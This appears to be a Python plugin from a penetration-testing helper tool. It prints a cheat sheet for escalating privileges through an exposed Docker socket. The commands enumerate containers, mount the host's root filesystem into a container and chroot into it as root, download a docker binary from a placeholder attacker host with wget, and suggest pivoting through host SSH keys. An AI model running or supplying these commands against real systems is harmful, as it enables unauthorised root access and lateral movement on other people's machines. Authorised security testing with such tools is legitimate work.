from rich.console import Console
from rich.panel import Panel
from rich.syntax import Syntax

console = Console()


def run(data, cred, args):

    #
    # Get socket
    #
    socket = None

    if hasattr(args, "extra") and args.extra:
        socket = args.extra[0]

    while not socket:
        socket = input("Docker socket > ").strip()

    console.print(
        Panel.fit(
            f"[bold cyan]Docker Socket Privilege Escalation[/bold cyan]\n\n"
            f"[white]Socket:[/white] {socket}",
            border_style="cyan",
        )
    )

    commands = f"""# ==========================================
# Enumeration
# ==========================================

# Running containers
docker -H unix://{socket} ps

# Available images
docker -H unix://{socket} image ls


# ==========================================
# Privilege Escalation
# ==========================================

# Replace 'ubuntu' with an available image
docker -H unix://{socket} run -v /:/mnt --rm -it ubuntu chroot /mnt bash


# ==========================================
# If Docker Is Not Installed
# ==========================================


# Upload a static Docker client
wget http://<ATTACKER_IP>/docker -O /tmp/docker
chmod +x /tmp/docker

# Enumeration
/tmp/docker -H unix://{socket} ps
/tmp/docker -H unix://{socket} image ls

# Privilege Escalation
/tmp/docker -H unix://{socket} run -v /:/mnt --rm -it ubuntu chroot /mnt bash
"""

    console.print(
        Syntax(
            commands,
            "bash",
            theme="monokai",
            line_numbers=False,
        )
    )

    console.print(
        Panel.fit(
            """[yellow]Notes[/yellow]

• Enumerate images first.
• Replace 'ubuntu' with an existing image if necessary.
• If docker is unavailable, upload a static docker binary.
• Mounting '/' gives access to the host filesystem under /mnt.
• If the mounted filesystem contains SSH keys, you can often pivot directly to the host.""",
            border_style="yellow",
        )
    )
